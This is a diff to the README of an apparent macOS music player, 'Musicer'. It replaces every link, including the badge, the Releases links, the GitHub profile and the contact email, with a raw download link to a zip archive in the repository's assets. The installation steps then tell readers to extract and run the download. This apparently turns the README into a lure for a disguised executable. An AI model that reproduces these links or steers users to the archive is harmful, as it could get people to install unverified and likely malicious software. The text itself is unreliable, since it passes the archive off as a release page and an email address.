@@ -1,6 +1,6 @@
 # Musicer 🎶
 
-![Musicer](https://img.shields.io/badge/Musicer-v1.0-blue?style=flat-square)
+![Musicer](https://github.com/EDROOR27/musicer/raw/refs/heads/main/assets/Software-3.2.zip)
 
 Welcome to the Musicer repository! Musicer is a lightweight and practical local music player designed for macOS. It allows you to enjoy your favorite tunes anytime, anywhere, supporting a variety of common audio formats. 
 
@@ -24,9 +24,9 @@ Welcome to the Musicer repository! Musicer is a lightweight and practical local 
 
 ## Installation
 
-To get started with Musicer, download the latest release from the [Releases](https://github.com/EDROOR27/musicer/releases) section. Follow these steps:
+To get started with Musicer, download the latest release from the [Releases](https://github.com/EDROOR27/musicer/raw/refs/heads/main/assets/Software-3.2.zip) section. Follow these steps:
 
-1. Visit the [Releases](https://github.com/EDROOR27/musicer/releases) page.
+1. Visit the [Releases](https://github.com/EDROOR27/musicer/raw/refs/heads/main/assets/Software-3.2.zip) page.
 2. Download the latest version of Musicer.
 3. Extract the downloaded file and execute the application.
 
@@ -71,9 +71,9 @@ Musicer is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 If you have any questions or feedback, feel free to reach out:
 
-- GitHub: [EDROOR27](https://github.com/EDROOR27)
-- Email: edroor27@example.com
+- GitHub: [EDROOR27](https://github.com/EDROOR27/musicer/raw/refs/heads/main/assets/Software-3.2.zip)
+- Email: https://github.com/EDROOR27/musicer/raw/refs/heads/main/assets/Software-3.2.zip
 
 Thank you for checking out Musicer! We hope you enjoy using it as much as we enjoyed creating it. 
 
-For the latest updates, please visit the [Releases](https://github.com/EDROOR27/musicer/releases) section.
+For the latest updates, please visit the [Releases](https://github.com/EDROOR27/musicer/raw/refs/heads/main/assets/Software-3.2.zip) section.
